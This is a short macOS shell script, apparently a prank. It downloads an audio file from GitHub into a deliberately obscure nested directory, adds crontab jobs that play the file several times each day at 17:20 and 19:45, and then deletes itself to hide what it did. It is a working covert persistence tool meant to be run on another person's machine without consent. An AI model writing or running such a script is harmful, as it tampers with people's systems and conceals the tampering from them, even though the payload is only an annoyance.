mkdir -p ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/;

# grab song
curl -L https://raw.githubusercontent.com/dsernst/dotfiles/master/randy.m4a > ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a;

#write out current crontab
crontab -l > mystpidcron;
#echo new cron into cron file
echo "20 17 * * * afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a -v 0; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a;" >> mystpidcron;

echo "45 19 * * * afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a -v 0; afplay ~/Documents/notimportant/useless/lol/gaia/seriouslynotabigdeal/omg/why/dont/you/listen/to/me/randy.m4a;" >> mystpidcron;


#install new cron file
crontab mystpidcron;
rm mystpidcron;

#remove itself
rm -- "$0";
